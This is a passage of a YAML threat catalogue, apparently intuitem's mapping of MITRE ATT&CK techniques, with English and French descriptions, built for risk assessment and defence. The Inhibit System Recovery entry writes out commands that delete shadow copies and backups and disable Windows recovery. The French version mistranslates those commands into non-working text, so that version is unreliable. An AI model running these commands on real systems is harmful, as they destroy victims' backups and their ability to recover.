          \ (IAT)**, qui utilise les modifications apport\xE9es \xE0 l\u2019IAT d\u2019\
          un processus, o\xF9 les pointeurs vers les fonctions API import\xE9es sont\
          \ stock\xE9s. (Citation : Injection de processus \xE9lastique juillet 2017)(Citation\
          \ : Adlice Software IAT Hooks octobre 2014)(Citation : MWRInfoSecurity Dynamic\
          \ Hooking 2015)\n* **Inline hooking**, qui \xE9crase les premiers octets\
          \ d\u2019une fonction API pour rediriger le flux de code. (Citation : Injection\
          \ de processus \xE9lastique juillet 2017)(Citation : HighTech Bridge Inline\
          \ Hooking septembre 2011)(Citation : MWRInfoSecurity Dynamic Hooking 2015)\n\
          https://attack.mitre.org/techniques/T1056/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1495
    ref_id: T1495
    name: Firmware Corruption
    description: 'Adversaries may overwrite or corrupt the flash memory contents of
      system BIOS or other firmware in devices attached to a system in order to render
      them inoperable or unable to boot, thus denying the availability to use the
      devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is
      software that is loaded and executed from non-volatile memory on hardware devices
      in order to initialize and manage device functionality. These devices may include
      the motherboard, hard drive, or video cards.


      In general, adversaries may manipulate, overwrite, or corrupt firmware in order
      to deny the use of the system or devices. For example, corruption of firmware
      responsible for loading the operating system for network devices may render
      the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation:
      cisa_malware_orgs_ukraine) Depending on the device, this attack may also result
      in [Data Destruction](https://attack.mitre.org/techniques/T1485).

      https://attack.mitre.org/techniques/T1495'
    translations:
      fr:
        name: Corruption du micrologiciel
        description: "Les adversaires peuvent \xE9craser ou corrompre le contenu de\
          \ la m\xE9moire flash du BIOS du syst\xE8me ou d\u2019autres micrologiciels\
          \ dans les p\xE9riph\xE9riques connect\xE9s \xE0 un syst\xE8me afin de les\
          \ rendre inutilisables ou incapables de d\xE9marrer, emp\xEAchant ainsi\
          \ la disponibilit\xE9 de l\u2019utilisation des p\xE9riph\xE9riques et/ou\
          \ du syst\xE8me. (R\xE9f\xE9rence : Symantec Chernobyl W95. CIH) Le micrologiciel\
          \ est un logiciel qui est charg\xE9 et ex\xE9cut\xE9 \xE0 partir de la m\xE9\
          moire non volatile sur des dispositifs mat\xE9riels afin d\u2019initialiser\
          \ et de g\xE9rer les fonctionnalit\xE9s des appareils. Il peut s\u2019agir\
          \ d\u2019une carte m\xE8re, d\u2019un disque dur ou d\u2019une carte vid\xE9\
          o.\n\nEn g\xE9n\xE9ral, les adversaires peuvent manipuler, \xE9craser ou\
          \ corrompre le micrologiciel afin d\u2019emp\xEAcher l\u2019utilisation\
          \ du syst\xE8me ou des appareils. Par exemple, la corruption du micrologiciel\
          \ responsable du chargement du syst\xE8me d\u2019exploitation des p\xE9\
          riph\xE9riques r\xE9seau peut rendre les p\xE9riph\xE9riques r\xE9seau inutilisables.\
          \ (R\xE9f\xE9rence : dhs_threat_to_net_devices)(R\xE9f\xE9rence : cisa_malware_orgs_ukraine)\
          \ Selon l\u2019appareil, cette attaque peut \xE9galement entra\xEEner la\
          \ [destruction des donn\xE9es](https://attack.mitre.org/techniques/T1485).\n\
          https://attack.mitre.org/techniques/T1495"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1490
    ref_id: T1490
    name: Inhibit System Recovery
    description: "Adversaries may delete or remove built-in data and turn off services\
      \ designed to aid in the recovery of a corrupted system to prevent recovery.(Citation:\
      \ Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny\
      \ access to available backups and recovery options.\n\nOperating systems may\
      \ contain features that can help fix corrupted systems, such as a backup catalog,\
      \ volume shadow copies, and automatic repair features. Adversaries may disable\
      \ or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485)\
      \ and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation:\
      \ Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore,\
      \ adversaries may disable recovery notifications, then corrupt backups.(Citation:\
      \ disable_notif_synology_ransom)\n\nA number of native Windows utilities have\
      \ been used by adversaries to disable or delete system recovery features:\n\n\
      * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on\
      \ a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows\
      \ Management Instrumentation](https://attack.mitre.org/techniques/T1047) can\
      \ be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n\
      * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog\
      \ - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code>\
      \ can be used to disable automatic Windows recovery features by modifying boot\
      \ configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\
      \ & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code>\
      \ can be used to disable Windows Recovery Environment (WinRE) repair/recovery\
      \ options of an infected system\n* <code>diskshadow.exe</code> can be used to\
      \ delete all volume shadow copies on a system - <code>diskshadow delete shadows\
      \ all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network\
      \ devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561)\
      \ to delete backup firmware images and reformat the file system, then [System\
      \ Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the\
      \ device. Together this activity may leave network devices completely inoperable\
      \ and inhibit recovery operations.\n\nAdversaries may also delete \u201Conline\u201D\
      \ backups that are connected to their network \u2013 whether via network storage\
      \ media or through folders that sync to cloud services.(Citation: ZDNet Ransomware\
      \ Backups 2020) In cloud environments, adversaries may disable versioning and\
      \ backup policies and delete snapshots, database backups, machine images, and\
      \ prior versions of objects designed to be used in disaster recovery scenarios.(Citation:\
      \ Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3\
      \ Ransomware)\nhttps://attack.mitre.org/techniques/T1490"
    translations:
      fr:
        name: "Inhiber la r\xE9cup\xE9ration du syst\xE8me"
        description: "Les adversaires peuvent supprimer ou supprimer des donn\xE9\
          es int\xE9gr\xE9es et d\xE9sactiver des services con\xE7us pour faciliter\
          \ la r\xE9cup\xE9ration d\u2019un syst\xE8me corrompu afin d\u2019emp\xEA\
          cher la r\xE9cup\xE9ration. (Citation : Talos Olympic Destroyer 2018)(Citation\
          \ : FireEye WannaCry 2017) Cela peut emp\xEAcher l\u2019acc\xE8s aux sauvegardes\
          \ et aux options de r\xE9cup\xE9ration disponibles.\n\nLes syst\xE8mes d\u2019\
          exploitation peuvent contenir des fonctionnalit\xE9s qui peuvent aider \xE0\
          \ r\xE9parer les syst\xE8mes corrompus, telles qu\u2019un catalogue de sauvegarde,\
          \ des clich\xE9s instantan\xE9s de volume et des fonctions de r\xE9paration\
          \ automatique. Les adversaires peuvent d\xE9sactiver ou supprimer les fonctions\
          \ de r\xE9cup\xE9ration du syst\xE8me pour augmenter les effets de [Destruction\
          \ de donn\xE9es](https://attack.mitre.org/techniques/T1485) et de [Donn\xE9\
          es chiffr\xE9es pour impact](https://attack.mitre.org/techniques/T1486).\
          \ (Citation : Talos Olympic Destroyer 2018)(Citation : FireEye WannaCry\
          \ 2017) De plus, les adversaires peuvent d\xE9sactiver les notifications\
          \ de r\xE9cup\xE9ration, puis corrompre les sauvegardes. (R\xE9f\xE9rence\
          \ : disable_notif_synology_ransom)\n\nUn certain nombre d\u2019utilitaires\
          \ Windows natifs ont \xE9t\xE9 utilis\xE9s par des adversaires pour d\xE9\
          sactiver ou supprimer les fonctionnalit\xE9s de r\xE9cup\xE9ration du syst\xE8\
          me :\n\n* <code>vssadmin.exe</code> peut \xEAtre utilis\xE9 pour supprimer\
          \ tous les clich\xE9s instantan\xE9s de volume sur un syst\xE8me - <code>vssadmin.exe\
          \ supprimer les clich\xE9s instantan\xE9s /all /quiet</code>\n* [Windows\
          \ Management Instrumentation](https://attack.mitre.org/techniques/T1047)\
          \ peut \xEAtre utilis\xE9 pour supprimer des clich\xE9s instantan\xE9s de\
          \ volume - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code>\
          \ peut \xEAtre utilis\xE9 pour supprimer le catalogue de sauvegarde Windows\
          \ - <code>wbadmin.exe supprimer le catalogue - silencieux</code>\n* <code>bcdedit.exe</code>\
          \ peut \xEAtre utilis\xE9 pour d\xE9sactiver les fonctionnalit\xE9s de r\xE9\
          cup\xE9ration automatique de Windows en modifiant les donn\xE9es de configuration\
          \ de d\xE9marrage - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\
          \ & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code>\
          \ peut \xEAtre utilis\xE9 pour d\xE9sactiver les options de r\xE9paration/r\xE9\
          cup\xE9ration de l\u2019environnement de r\xE9cup\xE9ration Windows (WinRE)\
          \ d\u2019un syst\xE8me infect\xE9.\n* <code>diskshadow.exe</code> peut \xEA\
          tre utilis\xE9 pour supprimer tous les clich\xE9s instantan\xE9s de volume\
          \ sur un syst\xE8me - <code>diskshadow delete shadows all</code> (Citation\_\
          : Diskshadow) (Citation\_: Crytox Ransomware)\n\nSur les p\xE9riph\xE9riques\
          \ r\xE9seau, les adversaires peuvent utiliser [Effacement de disque](https://attack.mitre.org/techniques/T1561)\
          \ pour supprimer les images de firmware de sauvegarde et reformater le syst\xE8\
          me de fichiers, puis [Arr\xEAt/Red\xE9marrage du syst\xE8me](https://attack.mitre.org/techniques/T1529)\
          \ pour recharger le p\xE9riph\xE9rique. Ensemble, ces activit\xE9s peuvent\
          \ rendre les p\xE9riph\xE9riques r\xE9seau compl\xE8tement inutilisables\
          \ et entraver les op\xE9rations de r\xE9cup\xE9ration.\n\nLes adversaires\
          \ peuvent \xE9galement supprimer les sauvegardes \xAB en ligne \xBB connect\xE9\
          es \xE0 leur r\xE9seau, que ce soit via des supports de stockage r\xE9seau\
          \ ou des dossiers synchronis\xE9s avec des services cloud. (Citation : Sauvegardes\
          \ ZDNet Ransomware 2020) Dans les environnements cloud, les adversaires\
          \ peuvent d\xE9sactiver les politiques de gestion des versions et de sauvegarde\
          \ et supprimer des instantan\xE9s, des sauvegardes de bases de donn\xE9\
          es, des images de machine et des versions ant\xE9rieures d\u2019objets con\xE7\
          us pour \xEAtre utilis\xE9s dans des sc\xE9narios de r\xE9cup\xE9ration\
          \ d\u2019urgence. (Citation : Dark Reading Code Spaces Cyber Attack)(Citation\
          \ : Rhino Security Labs AWS S3 Ransomware)\nhttps://attack.mitre.org/techniques/T1490"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.007
    ref_id: T1546.007
    name: Netsh Helper DLL
    description: 'Adversaries may establish persistence by executing malicious content
      triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is
      a command-line scripting utility used to interact with the network configuration
      of a system. It contains functionality to add helper DLLs for extending functionality
      of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper
      DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.


      Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary
      code in a persistent manner. This execution would take place anytime netsh.exe
      is executed, which could happen automatically, with another persistence technique,
      or if other software (ex: VPN) is present on the system that executes netsh.exe
      as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation:
      Demaske Netsh Persistence)

      https://attack.mitre.org/techniques/T1546/007'
    translations:
      fr:
        name: "DLL d\u2019aide Netsh"
        description: "Les adversaires peuvent \xE9tablir une persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par des DLL Netsh Helper.\
          \ Netsh.exe (\xE9galement appel\xE9 Netshell) est un utilitaire de script\
          \ de ligne de commande utilis\xE9 pour interagir avec la configuration r\xE9\
          seau d\u2019un syst\xE8me. Il contient une fonctionnalit\xE9 permettant\
          \ d\u2019ajouter des DLL d\u2019assistance pour \xE9tendre les fonctionnalit\xE9\
          s de l\u2019utilitaire. (Citation : TechNet Netsh) Les chemins d\u2019acc\xE8\
          s aux DLL d\u2019assistance netsh.exe enregistr\xE9es sont entr\xE9s dans\
          \ le registre Windows \xE0 <code>l\u2019adresse HKLM\\SOFTWARE\\Microsoft\\\
          Netsh</code>.\n\nLes adversaires peuvent utiliser des DLL d\u2019assistance\
          \ netsh.exe pour d\xE9clencher l\u2019ex\xE9cution de code arbitraire de\
          \ mani\xE8re persistante. Cette ex\xE9cution aurait lieu \xE0 tout moment\
          \ netsh.exe est ex\xE9cut\xE9e, ce qui pourrait se produire automatiquement,\
          \ avec une autre technique de persistance, ou si un autre logiciel (ex :\
          \ VPN) est pr\xE9sent sur le syst\xE8me qui netsh.exe ex\xE9cute dans le\
          \ cadre de sa fonctionnalit\xE9 normale. (citation : balise Github Netsh\
          \ Helper CS)(citation : Demaske Netsh Persistence)\nhttps://attack.mitre.org/techniques/T1546/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.003
    ref_id: T1566.003
    name: Spearphishing via Service
    description: "Adversaries may send spearphishing messages via third-party services\
      \ in an attempt to gain access to victim systems. Spearphishing via service\
      \ is a specific variant of spearphishing. It is different from other forms of\
      \ spearphishing in that it employs the use of third party services rather than\
      \ directly via enterprise email channels. \n\nAll forms of spearphishing are\
      \ electronically delivered social engineering targeted at a specific individual,\
      \ company, or industry. In this scenario, adversaries send messages through\
      \ various social media services, personal webmail, and other non-enterprise\
      \ controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services\
      \ are more likely to have a less-strict security policy than an enterprise.\
      \ As with most kinds of spearphishing, the goal is to generate rapport with\
      \ the target or get the target's interest in some way. Adversaries will create\
      \ fake social media accounts and message employees for potential job opportunities.\
      \ Doing so allows a plausible reason for asking about services, policies, and\
      \ software that's running in an environment. The adversary can then send malicious\
      \ links or attachments through these services.\n\nA common example is to build\
      \ rapport with a target via social media, then send content to a personal webmail\
      \ service that the target uses on their work computer. This allows an adversary\
      \ to bypass some email restrictions on the work account, and the target is more\
      \ likely to open the file since it's something they were expecting. If the payload\
      \ doesn't work as expected, the adversary can continue normal communications\
      \ and troubleshoot with the target on how to get it working.\nhttps://attack.mitre.org/techniques/T1566/003"
    translations:
      fr:
        name: Spearphishing via Service
        description: "Les adversaires peuvent envoyer des messages de spearphishing\
          \ via des services tiers pour tenter d\u2019acc\xE9der aux syst\xE8mes des\
          \ victimes. Le spearphishing via le service est une variante sp\xE9cifique\
          \ du spearphishing. Il se distingue des autres formes de spearphishing par\
          \ le fait qu\u2019il utilise des services tiers plut\xF4t que directement\
          \ via les canaux de messagerie de l\u2019entreprise. \n\nToutes les formes\
          \ de spearphishing sont des actions d\u2019ing\xE9nierie sociale transmises\
          \ par voie \xE9lectronique et ciblent une personne, une entreprise ou un\
          \ secteur d\u2019activit\xE9 sp\xE9cifique. Dans ce sc\xE9nario, les adversaires\
          \ envoient des messages par le biais de divers services de m\xE9dias sociaux,\
          \ de messagerie Web personnelle et d\u2019autres services non contr\xF4\
          l\xE9s par l\u2019entreprise. (Citation : Lookout Dark Caracal janvier 2018)\
          \ Ces services sont plus susceptibles d\u2019avoir une politique de s\xE9\
          curit\xE9 moins stricte qu\u2019une entreprise. Comme pour la plupart des\
          \ types de spearphishing, l\u2019objectif est de g\xE9n\xE9rer un rapport\
          \ avec la cible ou d\u2019obtenir son int\xE9r\xEAt d\u2019une mani\xE8\
          re ou d\u2019une autre. Les adversaires cr\xE9eront de faux comptes sur\
          \ les r\xE9seaux sociaux et enverront des messages aux employ\xE9s pour\
          \ leur proposer des opportunit\xE9s d\u2019emploi potentielles. Cela permet\
          \ d\u2019obtenir une raison plausible de poser des questions sur les services,\
          \ les politiques et les logiciels qui s\u2019ex\xE9cutent dans un environnement.\
          \ L\u2019adversaire peut ensuite envoyer des liens ou des pi\xE8ces jointes\
          \ malveillants via ces services.\n\nUn exemple courant est d\u2019\xE9tablir\
          \ une relation avec une cible via les m\xE9dias sociaux, puis d\u2019envoyer\
          \ du contenu \xE0 un service de messagerie Web personnel que la cible utilise\
          \ sur son ordinateur de travail. Cela permet \xE0 un adversaire de contourner\
          \ certaines restrictions d\u2019e-mail sur le compte professionnel, et la\
          \ cible est plus susceptible d\u2019ouvrir le fichier car c\u2019est quelque\
          \ chose qu\u2019elle attendait. Si la charge utile ne fonctionne pas comme\
          \ pr\xE9vu, l\u2019adversaire peut poursuivre les communications normales\
          \ et r\xE9soudre les probl\xE8mes avec la cible pour savoir comment la faire\
          \ fonctionner.\nhttps://attack.mitre.org/techniques/T1566/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.001
    ref_id: T1090.001
    name: Internal Proxy
    description: 'Adversaries may use an internal proxy to direct command and control
      traffic between two or more systems in a compromised environment. Many tools
      exist that enable traffic redirection through proxies or port redirection, including
      [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation:
      Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command
      and control communications inside a compromised environment, to reduce the number
      of simultaneous outbound network connections, to provide resiliency in the face
      of connection loss, or to ride over existing trusted communications paths between
      infected systems to avoid suspicion. Internal proxy connections may use common
      peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with
      the environment.


      By using a compromised internal system as a proxy, adversaries may conceal the
      true destination of C2 traffic while reducing the need for numerous connections
      to external systems.

      https://attack.mitre.org/techniques/T1090/001'
    translations:
      fr:
        name: Proxy interne
        description: "Les adversaires peuvent utiliser un proxy interne pour diriger\
          \ le trafic de commande et de contr\xF4le entre deux syst\xE8mes ou plus\
          \ dans un environnement compromis. Il existe de nombreux outils qui permettent\
          \ la redirection du trafic via des proxys ou la redirection de port, notamment\
          \ [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy et ZXPortMap.\
          \ (Citation : Outils d\u2019attaque APT de Trend Micro) Les adversaires\
          \ utilisent des proxys internes pour g\xE9rer les communications de commande\
          \ et de contr\xF4le dans un environnement compromis, pour r\xE9duire le\
          \ nombre de connexions r\xE9seau sortantes simultan\xE9es, pour assurer\
          \ la r\xE9silience en cas de perte de connexion ou pour contourner les chemins\
          \ de communication fiables existants entre les syst\xE8mes infect\xE9s afin\
          \ d\u2019\xE9viter les soup\xE7ons. Les connexions proxy internes peuvent\
          \ utiliser des protocoles de mise en r\xE9seau peer-to-peer (p2p) courants,\
          \ tels que SMB, pour mieux s\u2019int\xE9grer \xE0 l\u2019environnement.\n\
          \nEn utilisant un syst\xE8me interne compromis comme proxy, les adversaires\
          \ peuvent dissimuler la v\xE9ritable destination du trafic C2 tout en r\xE9\
          duisant le besoin de nombreuses connexions \xE0 des syst\xE8mes externes.\n\
          https://attack.mitre.org/techniques/T1090/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216
    ref_id: T1216
    name: System Script Proxy Execution
    description: 'Adversaries may use trusted scripts, often signed with certificates,
      to proxy the execution of malicious files. Several Microsoft signed scripts
      that have been downloaded from Microsoft or are default on Windows installations
      can be used to proxy execution of other files.(Citation: LOLBAS Project) This
      behavior may be abused by adversaries to execute malicious files that could
      bypass application control and signature validation on systems.(Citation: GitHub
      Ultimate AppLocker Bypass List)

      https://attack.mitre.org/techniques/T1216'
    translations:
      fr:
        name: "Ex\xE9cution du proxy de script syst\xE8me"
        description: "Les adversaires peuvent utiliser des scripts de confiance, souvent\
          \ sign\xE9s avec des certificats, pour proxy l\u2019ex\xE9cution de fichiers\
          \ malveillants. Plusieurs scripts sign\xE9s par Microsoft qui ont \xE9t\xE9\
          \ t\xE9l\xE9charg\xE9s \xE0 partir de Microsoft ou qui sont par d\xE9faut\
          \ sur les installations Windows peuvent \xEAtre utilis\xE9s pour l\u2019\
          ex\xE9cution proxy d\u2019autres fichiers. (Citation : Projet LOLBAS) Ce\
          \ comportement peut \xEAtre exploit\xE9 par des adversaires pour ex\xE9\
          cuter des fichiers malveillants susceptibles de contourner le contr\xF4\
          le des applications et la validation des signatures sur les syst\xE8mes.\
          \ (Citation : GitHub Ultimate AppLocker Bypass List)\nhttps://attack.mitre.org/techniques/T1216"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102.001
    ref_id: T1102.001
    name: Dead Drop Resolver
    description: 'Adversaries may use an existing, legitimate external Web service
      to host information that points to additional command and control (C2) infrastructure.
      Adversaries may post content, known as a dead drop resolver, on Web services
      with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected,
      victims will reach out to and be redirected by these resolvers.


      Popular websites and social media acting as a mechanism for C2 may give a significant
      amount of cover due to the likelihood that hosts within a network are already
      communicating with them prior to a compromise. Using common services, such as
      those offered by Google or Twitter, makes it easier for adversaries to hide
      in expected noise. Web service providers commonly use SSL/TLS encryption, giving
      adversaries an added level of protection.


      Use of a dead drop resolver may also protect back-end C2 infrastructure from
      discovery through malware binary analysis while also enabling operational resiliency
      (since this infrastructure may be dynamically changed).

      https://attack.mitre.org/techniques/T1102/001'
    translations:
      fr:
        name: "R\xE9solveur Dead Drop"
        description: "Les adversaires peuvent utiliser un service Web externe l\xE9\
          gitime existant pour h\xE9berger des informations qui pointent vers une\
          \ infrastructure de commande et de contr\xF4le (C2) suppl\xE9mentaire. Les\
          \ adversaires peuvent publier du contenu, connu sous le nom de r\xE9solveur\
          \ de dead drop, sur des services Web avec des domaines ou des adresses IP\
          \ int\xE9gr\xE9s (et souvent obfusqu\xE9s/encod\xE9s). Une fois infect\xE9\
          es, les victimes se dirigent vers ces r\xE9solveurs et sont redirig\xE9\
          es par eux.\n\nLes sites Web populaires et les m\xE9dias sociaux agissant\
          \ comme un m\xE9canisme pour C2 peuvent offrir une couverture importante\
          \ en raison de la probabilit\xE9 que les h\xF4tes d\u2019un r\xE9seau communiquent\
          \ d\xE9j\xE0 avec eux avant une compromission. L\u2019utilisation de services\
          \ courants, tels que ceux propos\xE9s par Google ou Twitter, permet aux\
          \ adversaires de se cacher plus facilement dans le bruit attendu. Les fournisseurs\
          \ de services Web utilisent g\xE9n\xE9ralement le cryptage SSL/TLS, ce qui\
          \ offre aux adversaires un niveau de protection suppl\xE9mentaire.\n\nL\u2019\
          utilisation d\u2019un r\xE9solveur Dead Drop peut \xE9galement prot\xE9\
          ger l\u2019infrastructure C2 back-end contre la d\xE9couverte par l\u2019\
          analyse binaire des logiciels malveillants, tout en permettant une r\xE9\
          silience op\xE9rationnelle (puisque cette infrastructure peut \xEAtre modifi\xE9\
          e dynamiquement).\nhttps://attack.mitre.org/techniques/T1102/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001.001
    ref_id: T1001.001
    name: Junk Data
    description: 'Adversaries may add junk data to protocols used for command and
      control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor
      December 2020) By adding random or meaningless data to the protocols used for
      command and control, adversaries can prevent trivial methods for decoding, deciphering,
      or otherwise analyzing the traffic. Examples may include appending/prepending
      data with junk characters or writing junk characters between significant characters.

      https://attack.mitre.org/techniques/T1001/001'
    translations:
      fr:
        name: "Donn\xE9es ind\xE9sirables"
        description: "Les adversaires peuvent ajouter des donn\xE9es inutiles aux\
          \ protocoles utilis\xE9s pour la commande et le contr\xF4le afin de rendre\
          \ la d\xE9tection plus difficile. (Citation : FireEye SUNBURST Backdoor\
          \ D\xE9cembre 2020) En ajoutant des donn\xE9es al\xE9atoires ou d\xE9nu\xE9\
          es de sens aux protocoles utilis\xE9s pour la commande et le contr\xF4le,\
          \ les adversaires peuvent emp\xEAcher les m\xE9thodes triviales de d\xE9\
          codage, de d\xE9chiffrage ou d\u2019analyse du trafic. Par exemple, l\u2019\
          ajout ou l\u2019ajout de caract\xE8res ind\xE9sirables ou l\u2019\xE9criture\
          \ de caract\xE8res ind\xE9sirables entre des caract\xE8res significatifs.\n\
          https://attack.mitre.org/techniques/T1001/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1598.001
    ref_id: T1598.001
    name: Spearphishing Service
    description: 'Adversaries may send spearphishing messages via third-party services
      to elicit sensitive information that can be used during targeting. Spearphishing
      for information is an attempt to trick targets into divulging information, frequently
      credentials or other actionable information. Spearphishing for information frequently
      involves social engineering techniques, such as posing as a source with a reason
      to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or
      sending multiple, seemingly urgent messages.


      All forms of spearphishing are electronically delivered social engineering targeted
      at a specific individual, company, or industry. In this scenario, adversaries
      send messages through various social media services, personal webmail, and other
      non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing)
      These services are more likely to have a less-strict security policy than an
      enterprise. As with most kinds of spearphishing, the goal is to generate rapport
      with the target or get the target''s interest in some way. Adversaries may create
      fake social media accounts and message employees for potential job opportunities.
      Doing so allows a plausible reason for asking about services, policies, and
      information about their environment. Adversaries may also use information from
      previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594))
      to craft persuasive and believable lures.

      https://attack.mitre.org/techniques/T1598/001'
    translations:
      fr:
        name: Spearphishing Service
        description: "Les adversaires peuvent envoyer des messages de spearphishing\
          \ par l\u2019interm\xE9diaire de services tiers afin d\u2019obtenir des\
          \ informations sensibles qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Le spearphishing pour obtenir des informations est une tentative d\u2019\
          inciter les cibles \xE0 divulguer des informations, souvent des informations\
          \ d\u2019identification ou d\u2019autres informations exploitables. Le spearphishing\
          \ pour obtenir des informations fait souvent appel \xE0 des techniques d\u2019\
          ing\xE9nierie sociale, telles que se faire passer pour une source ayant\
          \ une raison de collecter des informations (ex : [\xC9tablir des comptes](https://attack.mitre.org/techniques/T1585)\
          \ ou [Compromettre des comptes](https://attack.mitre.org/techniques/T1586))\
          \ et/ou envoyer plusieurs messages apparemment urgents.\n\nToutes les formes\
          \ de spearphishing sont des actions d\u2019ing\xE9nierie sociale transmises\
          \ par voie \xE9lectronique et ciblent une personne, une entreprise ou un\
          \ secteur d\u2019activit\xE9 sp\xE9cifique. Dans ce sc\xE9nario, les adversaires\
          \ envoient des messages par le biais de divers services de m\xE9dias sociaux,\
          \ de messagerie Web personnelle et d\u2019autres services non contr\xF4\
          l\xE9s par l\u2019entreprise. (Citation : Phishing sur les r\xE9seaux sociaux\
          \ ThreatPost) Ces services sont plus susceptibles d\u2019avoir une politique\
          \ de s\xE9curit\xE9 moins stricte qu\u2019une entreprise. Comme pour la\
          \ plupart des types de spearphishing, l\u2019objectif est de g\xE9n\xE9\
          rer un rapport avec la cible ou d\u2019obtenir son int\xE9r\xEAt d\u2019\
          une mani\xE8re ou d\u2019une autre. Les adversaires peuvent cr\xE9er de\
          \ faux comptes sur les r\xE9seaux sociaux et envoyer des messages aux employ\xE9\
          s pour leur proposer des opportunit\xE9s d\u2019emploi potentielles. Ce\
          \ faisant, il y a une raison plausible de poser des questions sur les services,\
          \ les politiques et les informations sur leur environnement. Les adversaires\
          \ peuvent \xE9galement utiliser des informations provenant d\u2019efforts\
          \ de reconnaissance ant\xE9rieurs (par exemple : [M\xE9dias sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Sites Web appartenant \xE0 des victimes de recherche](https://attack.mitre.org/techniques/T1594))\
          \ pour cr\xE9er des leurres convaincants et cr\xE9dibles.\nhttps://attack.mitre.org/techniques/T1598/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.007
    ref_id: T1552.007
    name: Container API
    description: 'Adversaries may gather credentials via APIs within a containers
      environment. APIs in these environments, such as the Docker API and Kubernetes
      APIs, allow a user to remotely manage their container resources and cluster
      components.(Citation: Docker API)(Citation: Kubernetes API)


      An adversary may access the Docker API to collect logs that contain credentials
      to cloud, container, and various other resources in the environment.(Citation:
      Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions,
      such as via a pod''s service account, may also use the Kubernetes API to retrieve
      credentials from the Kubernetes API server. These credentials may include those
      needed for Docker API authentication or secrets from Kubernetes cluster components.

      https://attack.mitre.org/techniques/T1552/007'
    translations:
      fr:
        name: API de conteneur
        description: "Les adversaires peuvent collecter des informations d\u2019identification\
          \ via des API dans un environnement de conteneurs. Les API de ces environnements,\
          \ telles que l\u2019API Docker et les API Kubernetes, permettent \xE0 un\
          \ utilisateur de g\xE9rer \xE0 distance ses ressources de conteneur et ses\
          \ composants de cluster. (Citation : API Docker)(Citation : API Kubernetes)\n\
          \nUn adversaire peut acc\xE9der \xE0 l\u2019API Docker pour collecter des\
          \ journaux contenant des informations d\u2019identification pour le cloud,\
          \ le conteneur et diverses autres ressources de l\u2019environnement. (Citation\
          \ : Unit\xE9 42 Daemons Docker non s\xE9curis\xE9s) Un adversaire disposant\
          \ d\u2019autorisations suffisantes, par exemple via le compte de service\
          \ d\u2019un pod, peut \xE9galement utiliser l\u2019API Kubernetes pour r\xE9\
          cup\xE9rer les informations d\u2019identification du serveur d\u2019API\
          \ Kubernetes. Ces informations d\u2019identification peuvent inclure celles\
          \ n\xE9cessaires \xE0 l\u2019authentification de l\u2019API Docker ou aux\
          \ secrets des composants du cluster Kubernetes.\nhttps://attack.mitre.org/techniques/T1552/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.001
    ref_id: T1584.001
    name: Domains
    description: 'Adversaries may hijack domains and/or subdomains that can be used
      during targeting. Domain registration hijacking is the act of changing the registration
      of a domain name without the permission of the original registrant.(Citation:
      ICANNDomainNameHijacking) Adversaries may gain access to an email account for
      the person listed as the owner of the domain. The adversary can then claim that
      they forgot their password in order to make changes to the domain registration.
      Other possibilities include social engineering a domain registration help desk
      to gain access to an account, taking advantage of renewal process gaps, or compromising
      a cloud service that enables managing domains (e.g., AWS Route53).(Citation:
      Krebs DNS Hijack 2019)


      Subdomain hijacking can occur when organizations have DNS entries that point
      to non-existent or deprovisioned resources. In such cases, an adversary may
      take control of a subdomain to conduct operations with the benefit of the trust
      associated with that domain.(Citation: Microsoft Sub Takeover 2020)


